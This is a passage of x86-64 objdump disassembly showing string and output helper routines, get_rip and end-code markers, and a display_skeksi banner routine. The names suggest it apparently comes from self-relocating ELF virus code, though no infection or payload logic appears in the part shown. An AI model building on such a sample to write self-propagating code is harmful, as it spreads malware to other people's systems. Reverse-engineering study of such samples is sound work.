  402af0:	48 89 c6             	mov    rsi,rax
  402af3:	bf 01 00 00 00       	mov    edi,0x1
  402af8:	e8 03 f6 ff ff       	call   402100 <_write>
  402afd:	bf 01 00 00 00       	mov    edi,0x1
  402b02:	e8 e6 f6 ff ff       	call   4021ed <_fsync>
  402b07:	b8 01 00 00 00       	mov    eax,0x1
  402b0c:	c9                   	leave  
  402b0d:	c3                   	ret    

0000000000402b0e <_puts_nl>:
  402b0e:	f3 0f 1e fa          	endbr64 
  402b12:	55                   	push   rbp
  402b13:	48 89 e5             	mov    rbp,rsp
  402b16:	48 83 ec 10          	sub    rsp,0x10
  402b1a:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402b1e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b22:	48 89 c7             	mov    rdi,rax
  402b25:	e8 3b 00 00 00       	call   402b65 <_strlen>
  402b2a:	48 89 c2             	mov    rdx,rax
  402b2d:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b31:	48 89 c6             	mov    rsi,rax
  402b34:	bf 01 00 00 00       	mov    edi,0x1
  402b39:	e8 c2 f5 ff ff       	call   402100 <_write>
  402b3e:	ba 01 00 00 00       	mov    edx,0x1
  402b43:	48 8d 35 11 03 00 00 	lea    rsi,[rip+0x311]        # 402e5b <display_skeksi+0x128>
  402b4a:	bf 01 00 00 00       	mov    edi,0x1
  402b4f:	e8 ac f5 ff ff       	call   402100 <_write>
  402b54:	bf 01 00 00 00       	mov    edi,0x1
  402b59:	e8 8f f6 ff ff       	call   4021ed <_fsync>
  402b5e:	b8 01 00 00 00       	mov    eax,0x1
  402b63:	c9                   	leave  
  402b64:	c3                   	ret    

0000000000402b65 <_strlen>:
  402b65:	f3 0f 1e fa          	endbr64 
  402b69:	55                   	push   rbp
  402b6a:	48 89 e5             	mov    rbp,rsp
  402b6d:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402b71:	48 c7 45 f8 00 00 00 	mov    QWORD PTR [rbp-0x8],0x0
  402b78:	00 
  402b79:	eb 05                	jmp    402b80 <_strlen+0x1b>
  402b7b:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402b80:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  402b84:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b88:	48 01 d0             	add    rax,rdx
  402b8b:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402b8e:	84 c0                	test   al,al
  402b90:	75 e9                	jne    402b7b <_strlen+0x16>
  402b92:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b96:	5d                   	pop    rbp
  402b97:	c3                   	ret    

0000000000402b98 <_toupper>:
  402b98:	f3 0f 1e fa          	endbr64 
  402b9c:	55                   	push   rbp
  402b9d:	48 89 e5             	mov    rbp,rsp
  402ba0:	89 f8                	mov    eax,edi
  402ba2:	88 45 fc             	mov    BYTE PTR [rbp-0x4],al
  402ba5:	80 7d fc 60          	cmp    BYTE PTR [rbp-0x4],0x60
  402ba9:	7e 16                	jle    402bc1 <_toupper+0x29>
  402bab:	80 7d fc 7a          	cmp    BYTE PTR [rbp-0x4],0x7a
  402baf:	7f 10                	jg     402bc1 <_toupper+0x29>
  402bb1:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402bb5:	83 e8 20             	sub    eax,0x20
  402bb8:	88 45 fc             	mov    BYTE PTR [rbp-0x4],al
  402bbb:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402bbf:	eb 04                	jmp    402bc5 <_toupper+0x2d>
  402bc1:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402bc5:	5d                   	pop    rbp
  402bc6:	c3                   	ret    

0000000000402bc7 <_strncmp>:
  402bc7:	f3 0f 1e fa          	endbr64 
  402bcb:	55                   	push   rbp
  402bcc:	48 89 e5             	mov    rbp,rsp
  402bcf:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402bd3:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  402bd7:	48 89 55 e8          	mov    QWORD PTR [rbp-0x18],rdx
  402bdb:	eb 53                	jmp    402c30 <_strncmp+0x69>
  402bdd:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402be1:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402be4:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402be8:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402beb:	38 c2                	cmp    dl,al
  402bed:	74 20                	je     402c0f <_strncmp+0x48>
  402bef:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402bf3:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402bf6:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402bfa:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402bfd:	38 c2                	cmp    dl,al
  402bff:	73 07                	jae    402c08 <_strncmp+0x41>
  402c01:	b8 ff ff ff ff       	mov    eax,0xffffffff
  402c06:	eb 34                	jmp    402c3c <_strncmp+0x75>
  402c08:	b8 01 00 00 00       	mov    eax,0x1
  402c0d:	eb 2d                	jmp    402c3c <_strncmp+0x75>
  402c0f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c13:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c16:	84 c0                	test   al,al
  402c18:	75 07                	jne    402c21 <_strncmp+0x5a>
  402c1a:	b8 00 00 00 00       	mov    eax,0x0
  402c1f:	eb 1b                	jmp    402c3c <_strncmp+0x75>
  402c21:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402c26:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402c2b:	48 83 6d e8 01       	sub    QWORD PTR [rbp-0x18],0x1
  402c30:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  402c35:	75 a6                	jne    402bdd <_strncmp+0x16>
  402c37:	b8 00 00 00 00       	mov    eax,0x0
  402c3c:	5d                   	pop    rbp
  402c3d:	c3                   	ret    

0000000000402c3e <_strcmp>:
  402c3e:	f3 0f 1e fa          	endbr64 
  402c42:	55                   	push   rbp
  402c43:	48 89 e5             	mov    rbp,rsp
  402c46:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402c4a:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  402c4e:	eb 1c                	jmp    402c6c <_strcmp+0x2e>
  402c50:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c54:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c57:	84 c0                	test   al,al
  402c59:	75 07                	jne    402c62 <_strcmp+0x24>
  402c5b:	b8 00 00 00 00       	mov    eax,0x0
  402c60:	eb 3a                	jmp    402c9c <_strcmp+0x5e>
  402c62:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402c67:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402c6c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c70:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402c73:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402c77:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c7a:	38 c2                	cmp    dl,al
  402c7c:	74 d2                	je     402c50 <_strcmp+0x12>
  402c7e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c82:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402c85:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402c89:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c8c:	38 c2                	cmp    dl,al
  402c8e:	73 07                	jae    402c97 <_strcmp+0x59>
  402c90:	b8 ff ff ff ff       	mov    eax,0xffffffff
  402c95:	eb 05                	jmp    402c9c <_strcmp+0x5e>
  402c97:	b8 01 00 00 00       	mov    eax,0x1
  402c9c:	5d                   	pop    rbp
  402c9d:	c3                   	ret    

0000000000402c9e <_memcmp>:
  402c9e:	f3 0f 1e fa          	endbr64 
  402ca2:	55                   	push   rbp
  402ca3:	48 89 e5             	mov    rbp,rsp
  402ca6:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402caa:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402cae:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402cb1:	eb 35                	jmp    402ce8 <_memcmp+0x4a>
  402cb3:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402cb7:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402cba:	88 45 ff             	mov    BYTE PTR [rbp-0x1],al
  402cbd:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402cc1:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402cc4:	88 45 fe             	mov    BYTE PTR [rbp-0x2],al
  402cc7:	0f b6 45 ff          	movzx  eax,BYTE PTR [rbp-0x1]
  402ccb:	3a 45 fe             	cmp    al,BYTE PTR [rbp-0x2]
  402cce:	74 0e                	je     402cde <_memcmp+0x40>
  402cd0:	0f b6 55 ff          	movzx  edx,BYTE PTR [rbp-0x1]
  402cd4:	0f b6 45 fe          	movzx  eax,BYTE PTR [rbp-0x2]
  402cd8:	29 c2                	sub    edx,eax
  402cda:	89 d0                	mov    eax,edx
  402cdc:	eb 17                	jmp    402cf5 <_memcmp+0x57>
  402cde:	48 83 45 e8 01       	add    QWORD PTR [rbp-0x18],0x1
  402ce3:	48 83 45 e0 01       	add    QWORD PTR [rbp-0x20],0x1
  402ce8:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  402ceb:	8d 50 ff             	lea    edx,[rax-0x1]
  402cee:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402cf1:	85 c0                	test   eax,eax
  402cf3:	75 be                	jne    402cb3 <_memcmp+0x15>
  402cf5:	5d                   	pop    rbp
  402cf6:	c3                   	ret    

0000000000402cf7 <get_rip>:
  402cf7:	f3 0f 1e fa          	endbr64 
  402cfb:	55                   	push   rbp
  402cfc:	48 89 e5             	mov    rbp,rsp
  402cff:	e8 00 00 00 00       	call   402d04 <get_rip_label>

0000000000402d04 <get_rip_label>:
  402d04:	58                   	pop    rax
  402d05:	48 89 c0             	mov    rax,rax
  402d08:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402d0c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402d10:	5d                   	pop    rbp
  402d11:	c3                   	ret    

0000000000402d12 <end_code>:
  402d12:	f3 0f 1e fa          	endbr64 
  402d16:	55                   	push   rbp
  402d17:	48 89 e5             	mov    rbp,rsp
  402d1a:	bf 00 00 00 00       	mov    edi,0x0
  402d1f:	e8 33 f3 ff ff       	call   402057 <Exit>
  402d24:	90                   	nop
  402d25:	5d                   	pop    rbp
  402d26:	c3                   	ret    

0000000000402d27 <dummy_marker>:
  402d27:	f3 0f 1e fa          	endbr64 
  402d2b:	55                   	push   rbp
  402d2c:	48 89 e5             	mov    rbp,rsp
  402d2f:	90                   	nop
  402d30:	90                   	nop
  402d31:	5d                   	pop    rbp
  402d32:	c3                   	ret    

0000000000402d33 <display_skeksi>:
  402d33:	f3 0f 1e fa          	endbr64 
  402d37:	55                   	push   rbp
  402d38:	48 89 e5             	mov    rbp,rsp
  402d3b:	ba ed 3b 00 00       	mov    edx,0x3bed
  402d40:	48 c7 c0 60 2e 40 00 	mov    rax,0x402e60
  402d47:	48 89 c6             	mov    rsi,rax
  402d4a:	bf 01 00 00 00       	mov    edi,0x1
  402d4f:	e8 ac f3 ff ff       	call   402100 <_write>
  402d54:	90                   	nop
  402d55:	5d                   	pop    rbp
  402d56:	c3                   	ret    
